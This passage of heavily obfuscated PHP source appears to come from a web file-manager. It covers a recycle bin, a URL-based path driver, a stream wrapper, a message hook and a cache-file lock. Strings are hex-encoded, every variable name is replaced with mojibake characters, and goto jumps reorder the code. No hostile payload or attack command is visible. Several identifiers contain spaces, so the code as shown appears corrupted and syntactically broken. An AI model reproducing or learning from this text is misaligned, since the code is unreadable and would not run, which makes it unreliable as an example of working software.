$this->where($®¯ﬁñ∑É)->sum($ö’µ€â£[80])); } Cache::set($ÌìüÀÌ⁄, $í˚ ﬂ¿·, 1200); return $í˚ ﬂ¿·; } public function fileNameExist($–˛©ºÜü, $¢‘Ö©Ú¶) { $∑Äñ·Ôú =& $_SERVER[Çâä∆◊¡]; $ù√Á∫ì¨ = $this->where(array($∑Äñ·Ôú[498] => $–˛©ºÜü, $∑Äñ·Ôú[32] => $¢‘Ö©Ú¶, $∑Äñ·Ôú[431] => 0))->find(); return is_array($ù√Á∫ì¨) ? $ù√Á∫ì¨[$∑Äñ·Ôú[403]] : !1; } public function childList($èµ–ﬁ‡ﬁ) { $Ì´π£∞ò =& $_SERVER[Çâä∆◊¡]; $ƒ÷ﬂ´ù = $Ì´π£∞ò[2084] . $èµ–ﬁ‡ﬁ; if (isset(self::$cacheChildList[$ƒ÷ﬂ´ù])) { return self::$cacheChildList[$ƒ÷ﬂ´ù]; } $Î¡≥â˛Ø = array($Ì´π£∞ò[498] => intval($èµ–ﬁ‡ﬁ), $Ì´π£∞ò[431] => 0); $ßŸå∏ä— = $this->where($Î¡≥â˛Ø)->select(); $ßŸå∏ä— = $ßŸå∏ä— ? $ßŸå∏ä— : array(); self::$cacheChildList[$ƒ÷ﬂ´ù] = $ßŸå∏ä—; foreach ($ßŸå∏ä— as $ïÓƒÕ°¬) { $ƒ÷ﬂ´ù = $Ì´π£∞ò[458] . $ïÓƒÕ°¬[$Ì´π£∞ò[403]]; self::$cacheSourceInfo[$ƒ÷ﬂ´ù] = $ïÓƒÕ°¬; } return $ßŸå∏ä—; } public function fileNameAuto($ÒÆΩÊÀ‚, $§πí”‚ﬂ, $  ≠˚¯Ä = REPEAT_RENAME, $ﬁ›≈¿ñ∏ = false) { $àÍﬂ»ëù =& $_SERVER[Çâä∆◊¡]; $§Â™πµì = array($àÍﬂ»ëù[498] => $ÒÆΩÊÀ‚, $àÍﬂ»ëù[431] => 0, $àÍﬂ»ëù[32] => array($àÍﬂ»ëù[378], $§πí”‚ﬂ . $àÍﬂ»ëù[379])); $’ÓÄßç± = $this->field($àÍﬂ»ëù[32])->where($§Â™πµì)->select(); $Ô“◊öú· = array_to_keyvalue($’ÓÄßç±, $àÍﬂ»ëù[12], $àÍﬂ»ëù[32]); return $this->fileNameAutoGet($Ô“◊öú·, $§πí”‚ﬂ, $  ≠˚¯Ä, $ﬁ›≈¿ñ∏); } public function fileNameAutoGet($ΩïñΩ∆∆, $≥ÖˆåÙ‡, $˚…¢ƒß±, $ãºÃøäø) { $‡æ°º¢« =& $_SERVER[Çâä∆◊¡]; if ($˚…¢ƒß± == REPEAT_REPLACE || !$ΩïñΩ∆∆ || !in_array_not_case($≥ÖˆåÙ‡, $ΩïñΩ∆∆) || $ãºÃøäø && $˚…¢ƒß± != REPEAT_RENAME_FOLDER) { return $≥ÖˆåÙ‡; } if ($˚…¢ƒß± == REPEAT_SKIP) { return !1; } $Ø©˚¶Ê = $‡æ°º¢«[10] . get_path_ext($≥ÖˆåÙ‡); $Ø©˚¶Ê = $Ø©˚¶Ê == $‡æ°º¢«[10] || $ãºÃøäø ? $‡æ°º¢«[12] : $Ø©˚¶Ê; for ($≈’ø¢’‘ = 1; $≈’ø¢’‘ <= count($ΩïñΩ∆∆) + 1; $≈’ø¢’‘++) { $ôÏ¯®Éå = substr($≥ÖˆåÙ‡, 0, strlen($≥ÖˆåÙ‡) - strlen($Ø©˚¶Ê)); $≤£∏éÄú = $ôÏ¯®Éå . "\x28{$≈’ø¢’‘}\x29{$Ø©˚¶Ê}"; if (!in_array_not_case($≤£∏éÄú, $ΩïñΩ∆∆)) { return $≤£∏éÄú; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\165\162\143\x65\x5f\162\145\x63\x79\143\x6c\x65"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\145\124\151\x6d\x65", "\x74\151\x6d\x65", "\x69\156\163\x65\162\164", "\x66\x75\x6e\143\164\151\x6f\x6e")); public function listData($∂ÒÊ‚ù¥ = false) { $˝¢©ƒ®ﬁ =& $_SERVER[Çâä∆◊¡]; $∂ÒÊ‚ù¥ = $∂ÒÊ‚ù¥ ? $∂ÒÊ‚ù¥ : USER_ID; $ëùüâÄÃ = $this->where(array($˝¢©ƒ®ﬁ[1633] => $∂ÒÊ‚ù¥))->select(); return array_to_keyvalue($ëùüâÄÃ, $˝¢©ƒ®ﬁ[12], $˝¢©ƒ®ﬁ[403]); } public function moveToRecycle($º≈˘Ü°è) { $ÿÎä∆ŒÆ =& $_SERVER[Çâä∆◊¡]; $ßÅ«Ã™› = Model($ÿÎä∆ŒÆ[1312]); $˙¸ÄÑéÏ = $ßÅ«Ã™›->sourceInfo($º≈˘Ü°è); if (!$˙¸ÄÑéÏ || $˙¸ÄÑéÏ[$ÿÎä∆ŒÆ[431]] == $ÿÎä∆ŒÆ[89]) { return; } $“ÇóÉ¥Ã = array($ÿÎä∆ŒÆ[418] => $º≈˘Ü°è, $ÿÎä∆ŒÆ[1633] => USER_ID, $ÿÎä∆ŒÆ[580] => $˙¸ÄÑéÏ[$ÿÎä∆ŒÆ[412]], $ÿÎä∆ŒÆ[581] => $˙¸ÄÑéÏ[$ÿÎä∆ŒÆ[504]], $ÿÎä∆ŒÆ[584] => $˙¸ÄÑéÏ[$ÿÎä∆ŒÆ[521]]); $this->add($“ÇóÉ¥Ã); $this->recycleMove($º≈˘Ü°è, 1); if ($˙¸ÄÑéÏ[$ÿÎä∆ŒÆ[411]] == $ÿÎä∆ŒÆ[89]) { $ÜŸÊ≤˝¿ = array($ÿÎä∆ŒÆ[584] => array($ÿÎä∆ŒÆ[544], $˙¸ÄÑéÏ[$ÿÎä∆ŒÆ[521]] . $º≈˘Ü°è . $ÿÎä∆ŒÆ[545])); $ßÅ«Ã™›->where($ÜŸÊ≤˝¿)->setField($ÿÎä∆ŒÆ[431], 1); } } public function clear() { $this->remove(!1); } public function remove($ı‹π§Ûä = false, $¬úºãÕÏ = false) { $‘˙åÏúú =& $_SERVER[Çâä∆◊¡]; $¬úºãÕÏ = $¬úºãÕÏ ? $¬úºãÕÏ : USER_ID; $”œ·÷πô = Model($‘˙åÏúú[1312]); $—û∂±£∞ = $this->listData($¬úºãÕÏ); $ı‹π§Ûä = $ı‹π§Ûä === !1 ? !1 : $ı‹π§Ûä; $Ä≥¨±¢∫ = array(); foreach ($—û∂±£∞ as $Ó§Æ¨Ñƒ) { if ($ı‹π§Ûä != !1 && !in_array($Ó§Æ¨Ñƒ, $ı‹π§Ûä)) { continue; } $Ù¸‡Ç¢Ù = $”œ·÷πô->sourceInfo($Ó§Æ¨Ñƒ); $”œ·÷πô->remove($Ó§Æ¨Ñƒ, !1); $©óÅ∆öï = $Ù¸‡Ç¢Ù[$‘˙åÏúú[412]] . $‘˙åÏúú[11] . $Ù¸‡Ç¢Ù[$‘˙åÏúú[504]]; $Ä≥¨±¢∫[$©óÅ∆öï] = array($‘˙åÏúú[580] => $Ù¸‡Ç¢Ù[$‘˙åÏúú[412]], $‘˙åÏúú[504] => $Ù¸‡Ç¢Ù[$‘˙åÏúú[504]]); $this->where(array($‘˙åÏúú[403] => $Ó§Æ¨Ñƒ))->delete(); } foreach ($Ä≥¨±¢∫ as $€ÓÓ”‡ˆ) { $”œ·÷πô->targetSpaceUpdate($€ÓÓ”‡ˆ[$‘˙åÏúú[412]], $€ÓÓ”‡ˆ[$‘˙åÏúú[504]]); } } public function restore($®éû◊–ñ = false) { $áπòÆßì = $this->listData(); $this->_restoreSource($áπòÆßì, $®éû◊–ñ); } public function removeUserAll($€Åà∂ƒ) { $this->remove(!1, $€Åà∂ƒ); } private function _restoreSource($≥≤£¨ÖÉ, $Üáóò¬Ë) { $ãîµƒ€∑ =& $_SERVER[Çâä∆◊¡]; $Êˆ≥ã √ = Model($ãîµƒ€∑[1312]); $Üáóò¬Ë = $Üáóò¬Ë == !1 ? !1 : $Üáóò¬Ë; if (!$≥≤£¨ÖÉ) { return !0; } $©Ô◊ë◊… = array(); foreach ($≥≤£¨ÖÉ as $®˘˝„ì) { if ($Üáóò¬Ë != !1 && !in_array($®˘˝„ì, $Üáóò¬Ë)) { continue; } $æ∏¸€èﬁ = $Êˆ≥ã √->sourceInfo($®˘˝„ì); $ƒœ…àÆµ = $Êˆ≥ã √->sourceInfo($æ∏¸€èﬁ[$ãîµƒ€∑[498]]); if ($ƒœ…àÆµ[$ãîµƒ€∑[431]] == $ãîµƒ€∑[89]) { continue; } $Êˆ≥ã √->lockMoveStart($®˘˝„ì); $this->recycleMove($®˘˝„ì, 0); if ($æ∏¸€èﬁ[$ãîµƒ€∑[411]] == $ãîµƒ€∑[89]) { $∂∆Ÿ«êæ = array($ãîµƒ€∑[584] => array($ãîµƒ€∑[544], $æ∏¸€èﬁ[$ãîµƒ€∑[521]] . $®˘˝„ì . $ãîµƒ€∑[545])); $Êˆ≥ã √->where($∂∆Ÿ«êæ)->setField($ãîµƒ€∑[431], 0); $this->restoreFolderChildren($®˘˝„ì, $≥≤£¨ÖÉ); } $this->where(array($ãîµƒ€∑[403] => $®˘˝„ì))->delete(); $Êˆ≥ã √->folderSizeReset($æ∏¸€èﬁ[$ãîµƒ€∑[498]]); $©Ô◊ë◊…[] = $æ∏¸€èﬁ[$ãîµƒ€∑[498]]; if ($æ∏¸€èﬁ[$ãîµƒ€∑[411]] == $ãîµƒ€∑[89]) { $©Ô◊ë◊…[] = $®˘˝„ì; } $Êˆ≥ã √->lockMoveEnd($®˘˝„ì); } $Êˆ≥ã √->updateModifyTime($©Ô◊ë◊…); } private function restoreFolderChildren($¯”≥õû´, $ﬁ•ßß§—) { $¿È®ùÿ– =& $_SERVER[Çâä∆◊¡]; $»ÿÅÚõî = Model($¿È®ùÿ–[1312]); $ïÅ¿ÓÄ¸ = array($¿È®ùÿ–[403] => array($¿È®ùÿ–[7], array())); foreach ($ﬁ•ßß§— as $ÀÓøÿ˝©) { if ($ÀÓøÿ˝© == $¯”≥õû´) { continue; } if (!$»ÿÅÚõî->isParentOf($¯”≥õû´, $ÀÓøÿ˝©)) { continue; } $ùå‰∂Òè = $»ÿÅÚõî->sourceInfo($ÀÓøÿ˝©); if ($ùå‰∂Òè[$¿È®ùÿ–[411]] == $¿È®ùÿ–[89]) { $ïÅ¿ÓÄ¸[] = array($¿È®ùÿ–[584] => array($¿È®ùÿ–[544], $ùå‰∂Òè[$¿È®ùÿ–[521]] . $ÀÓøÿ˝© . $¿È®ùÿ–[545])); } else { $ïÅ¿ÓÄ¸[$¿È®ùÿ–[403]][1][] = $ÀÓøÿ˝©; } } if (!$ïÅ¿ÓÄ¸[$¿È®ùÿ–[403]][1]) { unset($ïÅ¿ÓÄ¸[$¿È®ùÿ–[403]]); } if (!$ïÅ¿ÓÄ¸) { return; } $ïÅ¿ÓÄ¸[$¿È®ùÿ–[403]][1] = array_unique($ïÅ¿ÓÄ¸[$¿È®ùÿ–[403]][1]); $ïÅ¿ÓÄ¸[$¿È®ùÿ–[987]] = $¿È®ùÿ–[1905]; $»ÿÅÚõî->where($ïÅ¿ÓÄ¸)->setField($¿È®ùÿ–[431], 1); } private function recycleMove($ü»†Úüê, $ı∞µ¥Êè = 1) { $ÂÆåÌ—¯ =& $_SERVER[Çâä∆◊¡]; $·€¡ûÌπ = Model($ÂÆåÌ—¯[1312]); $˜œØ·⁄∆ = Model($ÂÆåÌ—¯[2110]); $∏Ò¬íÅ¶ = array($ÂÆåÌ—¯[403] => $ü»†Úüê); if ($ı∞µ¥Êè) { $·€¡ûÌπ->where($∏Ò¬íÅ¶)->setField($ÂÆåÌ—¯[431], 1); $˜œØ·⁄∆->eventRecycle($ü»†Úüê, $ÂÆåÌ—¯[2111]); } else { $ ∂˝¥ûÖ = $·€¡ûÌπ->where($∏Ò¬íÅ¶)->find(); $®¸‚“Õç = $ ∂˝¥ûÖ[$ÂÆåÌ—¯[411]] == $ÂÆåÌ—¯[89]; $¿ØÖ‹Ÿê = $·€¡ûÌπ->fileNameAuto($ ∂˝¥ûÖ[$ÂÆåÌ—¯[498]], $ ∂˝¥ûÖ[$ÂÆåÌ—¯[32]], REPEAT_RENAME_FOLDER, $®¸‚“Õç); if ($¿ØÖ‹Ÿê != $ ∂˝¥ûÖ[$ÂÆåÌ—¯[32]]) { $·€¡ûÌπ->rename($ü»†Úüê, $¿ØÖ‹Ÿê); } $·€¡ûÌπ->where($∏Ò¬íÅ¶)->setField($ÂÆåÌ—¯[431], 0); $˜œØ·⁄∆->eventRecycle($ü»†Úüê, $ÂÆåÌ—¯[2112]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\x6d\x2e\163\157\x75\162\x63\x65\123\145\x63\x72\x65\164\114\151\x73\164"; public $field = array("\x73\x6f\165\162\x63\x65\x49\x44", "\x74\171\160\x65\111\x44", "\x63\162\145\x61\x74\x65\125\x73\x65\x72"); } goto A⁄êÇı≠·‚; C»Ö˘î≥—À: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ÉŒ“ü·¢ = false) { } public function exist($“·æ•Â¿) { $Æ–â˛∂Ç = $this->info($“·æ•Â¿); return $Æ–â˛∂Ç[$_SERVER[Çâä∆◊¡][194]]; } public function isFile($˚πØÕ≈”) { $ËÅÒ®µÙ = $this->info($˚πØÕ≈”); return $ËÅÒ®µÙ[$_SERVER[Çâä∆◊¡][194]]; } public function isFolder($›Ïêæ‰Â) { return !1; } public function size($≈ˆ¸ôñ˘) { $Ú‚„ôå‘ = $this->info($≈ˆ¸ôñ˘); return $Ú‚„ôå‘[$_SERVER[Çâä∆◊¡][80]]; } public function info($ì™∂â‚ª) { return $this->infoParse($ì™∂â‚ª); } public function infoAuth($˙≤´˜“§) { return $this->infoParse($˙≤´˜“§); } public function infoWithChildren($∫˙Ö›–™) { return $this->infoParse($∫˙Ö›–™); } public function infoFull($÷®‰≥ÈÌ) { return $this->infoParse($÷®‰≥ÈÌ); } private function infoParse($ïÖÔÌ®ã) { $§‡Ê‡ﬁ© =& $_SERVER[Çâä∆◊¡]; $È¨‰™ÂŸ = $this->header($ïÖÔÌ®ã); if (!$È¨‰™ÂŸ || !$È¨‰™ÂŸ[$§‡Ê‡ﬁ©[743]]) { return !1; } $œ°…ô˚Ç = _get($È¨‰™ÂŸ, $§‡Ê‡ﬁ©[332], 0); $˚ŸÖä«ﬁ = array($§‡Ê‡ﬁ©[32] => $È¨‰™ÂŸ[$§‡Ê‡ﬁ©[32]], $§‡Ê‡ﬁ©[78] => $ïÖÔÌ®ã, $§‡Ê‡ﬁ©[33] => $§‡Ê‡ﬁ©[192], $§‡Ê‡ﬁ©[80] => intval($œ°…ô˚Ç), $§‡Ê‡ﬁ©[167] => get_path_ext($È¨‰™ÂŸ[$§‡Ê‡ﬁ©[32]]), $§‡Ê‡ﬁ©[1363] => $œ°…ô˚Ç > 0 && $È¨‰™ÂŸ[$§‡Ê‡ﬁ©[1485]], $§‡Ê‡ﬁ©[1364] => !1); return $˚ŸÖä«ﬁ; } private function header($Ú’Ó°Ï™) { $á≠Âﬁ£˘ =& $_SERVER[Çâä∆◊¡]; if (isset(self::$_cacheHeader[$Ú’Ó°Ï™])) { return self::$_cacheHeader[$Ú’Ó°Ï™]; } $‘ﬁ¢˝¶© = isset($GLOBALS[$á≠Âﬁ£˘[1486]]) ? $GLOBALS[$á≠Âﬁ£˘[1486]] : !1; $GLOBALS[$á≠Âﬁ£˘[1486]] = !0; self::$_cacheHeader[$Ú’Ó°Ï™] = url_header($Ú’Ó°Ï™); $GLOBALS[$á≠Âﬁ£˘[1486]] = $‘ﬁ¢˝¶©; return self::$_cacheHeader[$Ú’Ó°Ï™]; } public function hashSimple($ÜÇ¥ı—ø, $¡ÕËí”¥ = false) { $È≤¯ç›‘ =& $_SERVER[Çâä∆◊¡]; $Ø∂ÉØ˜Ç = $this->info($ÜÇ¥ı—ø); if (!$Ø∂ÉØ˜Ç || !$Ø∂ÉØ˜Ç[$È≤¯ç›‘[194]]) { return !1; } $Á˝©˜Ó“ = $Ø∂ÉØ˜Ç[$È≤¯ç›‘[80]]; $áØ‡ÕΩ‰ = 200; $‹≈¯á≠¶ = 50; if ($Á˝©˜Ó“ <= $áØ‡ÕΩ‰ * $‹≈¯á≠¶) { return md5($this->fileSubstr($ÜÇ¥ı—ø, 0, $Á˝©˜Ó“)) . $Á˝©˜Ó“; } $π º¨ü– = intval($Á˝©˜Ó“ / $‹≈¯á≠¶); $‘µ√©˙  = $È≤¯ç›‘[12]; $¥Ôøöóö = timeFloat(); $Ü⁄º€úº = 15; for ($·˝‰óÇ≠ = 0; $·˝‰óÇ≠ < $‹≈¯á≠¶; $·˝‰óÇ≠++) { if (timeFloat() - $¥Ôøöóö > $Ü⁄º€úº) { return !1; } $˜“‚Éò» = $this->fileSubstr($ÜÇ¥ı—ø, $π º¨ü– * $·˝‰óÇ≠, $áØ‡ÕΩ‰); if (!$˜“‚Éò») { return !1; } $‘µ√©˙  .= $˜“‚Éò»; } $‘µ√©˙  .= $this->fileSubstr($ÜÇ¥ı—ø, $Á˝©˜Ó“ - $áØ‡ÕΩ‰, $áØ‡ÕΩ‰); return md5($‘µ√©˙ ) . $Á˝©˜Ó“; } public function getContent($ÉÂ∞Áï—) { return $this->fileSubstr($ÉÂ∞Áï—); } public function fileSubstr($”π–ëµ, $Õ•ÆÁ∂ö = 0, $÷ÿÆºÖì = -1) { $â€¬»èÚ =& $_SERVER[Çâä∆◊¡]; $£π±±°Ü = $this->info($”π–ëµ); if (!$£π±±°Ü || !$£π±±°Ü[$â€¬»èÚ[194]] && $£π±±°Ü[$â€¬»èÚ[80]] > 1024 * 1024 * 10) { return !1; } if ($÷ÿÆºÖì === -1) { $÷ÿÆºÖì = $£π±±°Ü[$â€¬»èÚ[80]]; } if ($÷ÿÆºÖì == 0) { return $â€¬»èÚ[12]; } $èË«üûã = array($â€¬»èÚ[1487] . $Õ•ÆÁ∂ö . $â€¬»èÚ[775] . ($Õ•ÆÁ∂ö + $÷ÿÆºÖì - 1)); $Æ©“¶ë = url_request($”π–ëµ, $â€¬»èÚ[225], !1, $èË«üûã, !1, !1, 1); return $Æ©“¶ë[$â€¬»èÚ[1178]] ? $Æ©“¶ë[$â€¬»èÚ[1178]] : $â€¬»èÚ[12]; } public function download($Ì•óÅ≥ô, $ﬂÅ‚ÛáÂ) { Downloader::start($Ì•óÅ≥ô, $ﬂÅ‚ÛáÂ); return $ﬂÅ‚ÛáÂ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ÍŒÎà“◊, $î¢”Œàÿ = '') { $this->info = $this->info($ÍŒÎà“◊); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Çâä∆◊¡][78]]; $this->pathOpen = $ÍŒÎà“◊; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ÍŒÎà“◊])) { self::$_chunkBuffer[$ÍŒÎà“◊] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($õ˘´ª˛≥) { $‚ã¯ø°ù = $this->fileSubstr($this->pose, $õ˘´ª˛≥); $this->pose += strlen($‚ã¯ø°ù); return $‚ã¯ø°ù; } public function stream_tell() { return $this->pose; } public function stream_seek($Ñá—ÜÕä, $îô¿ ’à) { $°áÛ¥¡Ö =& $_SERVER[Çâä∆◊¡]; if ($îô¿ ’à == SEEK_SET) { $this->pose = $Ñá—ÜÕä; } else { if ($îô¿ ’à == SEEK_CUR) { $this->pose += $Ñá—ÜÕä; } else { if ($îô¿ ’à == SEEK_END) { $this->pose = $this->info[$°áÛ¥¡Ö[80]] + intval($Ñá—ÜÕä); } } } if ($Ñá—ÜÕä < 0) { $this->pose = $this->info[$°áÛ¥¡Ö[80]] + $Ñá—ÜÕä; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Çâä∆◊¡][80]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($æﬁ˙≈ïî, $˘√‘Ñ≤á) { $Æü∫ÎûÁ =& $_SERVER[Çâä∆◊¡]; $ûèˆÉÀÉ = $this->info($æﬁ˙≈ïî); return array($Æü∫ÎûÁ[1488] => 0, $Æü∫ÎûÁ[1489] => 0, $Æü∫ÎûÁ[16] => 32768 + 511, $Æü∫ÎûÁ[1490] => 0, $Æü∫ÎûÁ[1491] => 0, $Æü∫ÎûÁ[1492] => 0, $Æü∫ÎûÁ[1493] => 0, $Æü∫ÎûÁ[80] => $ûèˆÉÀÉ[$Æü∫ÎûÁ[80]], $Æü∫ÎûÁ[1494] => $ûèˆÉÀÉ[$Æü∫ÎûÁ[1362]], $Æü∫ÎûÁ[1450] => $ûèˆÉÀÉ[$Æü∫ÎûÁ[86]], $Æü∫ÎûÁ[1449] => $ûèˆÉÀÉ[$Æü∫ÎûÁ[193]], $Æü∫ÎûÁ[1495] => 0, $Æü∫ÎûÁ[1496] => 0); } static $fileInfo = array(); public function info($ÿ◊Ω–ˆù) { $òø≠å•∞ = $_SERVER[Çâä∆◊¡][1497]; if (isset(self::$fileInfo[$ÿ◊Ω–ˆù])) { return self::$fileInfo[$ÿ◊Ω–ˆù]; } if (substr($ÿ◊Ω–ˆù, 0, strlen($òø≠å•∞)) != $òø≠å•∞) { return !1; } self::$fileInfo[$ÿ◊Ω–ˆù] = IO::info(substr($ÿ◊Ω–ˆù, strlen($òø≠å•∞))); return self::$fileInfo[$ÿ◊Ω–ˆù]; } public static function read($Ó®åØä‹, $⁄∆˙≠Ä , $ö∏ƒº∂ã) { if (!isset(self::$_fopenCache[$Ó®åØä‹])) { $”∏êçÒÛ = new StreamWrapperIO(); $”∏êçÒÛ->stream_open($Ó®åØä‹); self::$_fopenCache[$Ó®åØä‹] = $”∏êçÒÛ; } $”∏êçÒÛ = self::$_fopenCache[$Ó®åØä‹]; return $”∏êçÒÛ->fileSubstr($⁄∆˙≠Ä , $ö∏ƒº∂ã); } public static function _read($íÍ¸∆¬Í, $§Öœôˆ÷, $Ä∏¸≈úæ) { $öÚÚ’Ê∫ =& $_SERVER[Çâä∆◊¡]; $ˆÇÒã•‚ = fopen($íÍ¸∆¬Í, $öÚÚ’Ê∫[1366]); if (!$ˆÇÒã•‚) { return $öÚÚ’Ê∫[12]; } $¶§›¸⁄‰ = 8192; fseek($ˆÇÒã•‚, $§Öœôˆ÷, SEEK_SET); $©·ŒùÜƒ = $öÚÚ’Ê∫[12]; $Äã±¿è§ = 0; while ($Äã±¿è§ < $Ä∏¸≈úæ) { $∆ñè‚°¥ = min($¶§›¸⁄‰, $Ä∏¸≈úæ - $Äã±¿è§); $©·ŒùÜƒ .= fread($ˆÇÒã•‚, $∆ñè‚°¥); $Äã±¿è§ += $∆ñè‚°¥; } fclose($ˆÇÒã•‚); return $©·ŒùÜƒ; } public function fileSubstr($‡–≥÷˘ü, $Ñıå†ßÍ) { $ª∏Ô‚§ﬂ =& $_SERVER[Çâä∆◊¡]; $•â€∞ú» = $this->info[$ª∏Ô‚§ﬂ[80]]; $Ÿ¢àÊŸá = $‡–≥÷˘ü; $§·⁄õŸÃ = $Ñıå†ßÍ; if ($‡–≥÷˘ü < 0) { $‡–≥÷˘ü = $•â€∞ú» + $‡–≥÷˘ü; } if ($Ñıå†ßÍ === !1) { $Ñıå†ßÍ = $•â€∞ú» - $‡–≥÷˘ü; } if ($‡–≥÷˘ü + $Ñıå†ßÍ > $•â€∞ú») { $Ñıå†ßÍ = $•â€∞ú» - $‡–≥÷˘ü; } if ($Ñıå†ßÍ <= 0) { return $ª∏Ô‚§ﬂ[12]; } if ($‡–≥÷˘ü < 0 || $‡–≥÷˘ü >= $•â€∞ú» || $Ñıå†ßÍ <= 0 || $Ñıå†ßÍ > 1024 * 1024 * 10) { throw new Exception("\151\157\106\151\x6c\x65\122\x65\141\144\x20\145\x72\x72\157\162\41\40\x73\164\x61\x72\x74\x3d{$‡–≥÷˘ü}\x3b\154\x65\x6e\x67\164\x68\x3d{$Ñıå†ßÍ}\x3b\x20\163\151\172\145\x3d{$•â€∞ú»}\73"); } $◊ç˙∑πÅ = 64 * 1024; $‹ˆéÎ±™ =& self::$_chunkBuffer[$this->path]; if (!$‹ˆéÎ±™) { $‹ˆéÎ±™ = array(); } $π‚Îª∞ˆ = 0; $¨≠—·å° = 0; $ë’Ô»Ö˚ = $ª∏Ô‚§ﬂ[12]; foreach ($‹ˆéÎ±™ as $π‚Îª∞ˆ => $ë’Ô»Ö˚) { $π‚Îª∞ˆ = intval($π‚Îª∞ˆ); $¨≠—·å° = $π‚Îª∞ˆ + strlen($ë’Ô»Ö˚); if ($‡–≥÷˘ü >= $¨≠—·å°) { continue; } if ($‡–≥÷˘ü >= $π‚Îª∞ˆ && $‡–≥÷˘ü + $Ñıå†ßÍ <= $¨≠—·å°) { return substr($ë’Ô»Ö˚, $‡–≥÷˘ü - $π‚Îª∞ˆ, $Ñıå†ßÍ); } break; } if (count($‹ˆéÎ±™) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ª∏Ô‚§ﬂ[1498], $ª∏Ô‚§ﬂ[1499] . count($‹ˆéÎ±™) . "\x3b\163\164\141\162\x74\75{$‡–≥÷˘ü}\x2c\x6c\145\156\147\164\x68\75{$Ñıå†ßÍ}\73\160\157\163\145\72{$π‚Îª∞ˆ}\x7e{$¨≠—·å°}"); throw new Exception($ª∏Ô‚§ﬂ[1500]); } $¯ß†îø™ = intval($‡–≥÷˘ü / $◊ç˙∑πÅ) * $◊ç˙∑πÅ; $µÅÜÈ≥∫ = ceil(($‡–≥÷˘ü + $Ñıå†ßÍ) / $◊ç˙∑πÅ) * $◊ç˙∑πÅ - $¯ß†îø™; $Å∞Ë⁄Õ˙ = IO::fileSubstr($this->path, $¯ß†îø™, $µÅÜÈ≥∫); $‹ˆéÎ±™[$¯ß†îø™ . $ª∏Ô‚§ﬂ[12]] = $Å∞Ë⁄Õ˙; ksort($‹ˆéÎ±™); $Ó‘ÿ‰ÄÀ = substr($Å∞Ë⁄Õ˙, $‡–≥÷˘ü - $¯ß†îø™, $Ñıå†ßÍ); return $Ó‘ÿ‰ÄÀ; } private function log($‚ú®®∏ﬂ, $˚Êƒ¬Ë˜) { $ÄÓâ€≠ç =& $_SERVER[Çâä∆◊¡]; $ƒﬂ÷õ£“ = timeFloat() - $this->timeStart; write_log(sprintf($ÄÓâ€≠ç[1501], $‚ú®®∏ﬂ, $this->info[$ÄÓâ€≠ç[32]], $ƒﬂ÷õ£“, $˚Êƒ¬Ë˜), $ÄÓâ€≠ç[1168]); } } class Message { function __construct() { } public function send($ÊπÜéÛ… = '', $ª—õ»‡¿ = array(), $•⁄Õ‘•— = "\164\145\170\x74") { $•§òÃ∑∆ =& $_SERVER[Çâä∆◊¡]; $Íö˜Ú«Ÿ = array($•§òÃ∑∆[33] => $•§òÃ∑∆[1502], $•§òÃ∑∆[748] => $ÊπÜéÛ…); if (in_array($•⁄Õ‘•—, array($•§òÃ∑∆[1502], $•§òÃ∑∆[1503]))) { $Íö˜Ú«Ÿ[$•§òÃ∑∆[33]] = $•⁄Õ‘•—; } $ª—õ»‡¿ = array($•§òÃ∑∆[515] => isset($ª—õ»‡¿[$•§òÃ∑∆[515]]) ? $ª—õ»‡¿[$•§òÃ∑∆[515]] : $•§òÃ∑∆[12], $•§òÃ∑∆[594] => isset($ª—õ»‡¿[$•§òÃ∑∆[594]]) ? $ª—õ»‡¿[$•§òÃ∑∆[594]] : $•§òÃ∑∆[12]); if (empty($ÊπÜéÛ…) || empty($ª—õ»‡¿[$•§òÃ∑∆[515]]) && empty($ª—õ»‡¿[$•§òÃ∑∆[594]])) { return !1; } $ë÷îÊí¥ = array($•§òÃ∑∆[1443] => $Íö˜Ú«Ÿ, $•§òÃ∑∆[1504] => $ª—õ»‡¿); Hook::trigger($•§òÃ∑∆[1505], $ë÷îÊí¥); } } goto F†«ÎÁàô»; b’±‰±¬˘˘: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ƒπ◊´ê¨ =& $_SERVER[Çâä∆◊¡]; $ÄÜ∆Ö∫¡ = $GLOBALS[$ƒπ◊´ê¨[6]][$ƒπ◊´ê¨[344]]; self::$cachePath = $ÄÜ∆Ö∫¡[$ƒπ◊´ê¨[192]][$ƒπ◊´ê¨[78]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($‡≥∂õ»ê, $ñˆŸìÛº = 0) { $¶§ÔÂÌ‹ =& $_SERVER[Çâä∆◊¡]; $¨ÆœÊ¡ = microtime(!0); $»ï˚—úé = $¨ÆœÊ¡ + $ñˆŸìÛº + 0.0001; $û¸áÚÂë = rtrim(self::$cachePath, $¶§ÔÂÌ‹[8]) . $¶§ÔÂÌ‹[852] . md5($‡≥∂õ»ê) . $¶§ÔÂÌ‹[849]; if (file_exists($û¸áÚÂë) && filemtime($û¸áÚÂë) && filemtime($û¸áÚÂë) < time() - 10) { @unlink($û¸áÚÂë); } do { if (file_exists($û¸áÚÂë)) { cacheLockWait(); continue; } $Øÿ≥àë„ = fopen($û¸áÚÂë, $¶§ÔÂÌ‹[853]); if (!$Øÿ≥àë„) { return !1; } $éªÈø£ = flock($Øÿ≥àë„, LOCK_EX | LOCK_NB); self::$caches[$‡≥∂õ»ê] = array($¶§ÔÂÌ‹[854] => $Øÿ≥àë„, $¶§ÔÂÌ‹[192] => $û¸áÚÂë); fwrite($Øÿ≥àë„, 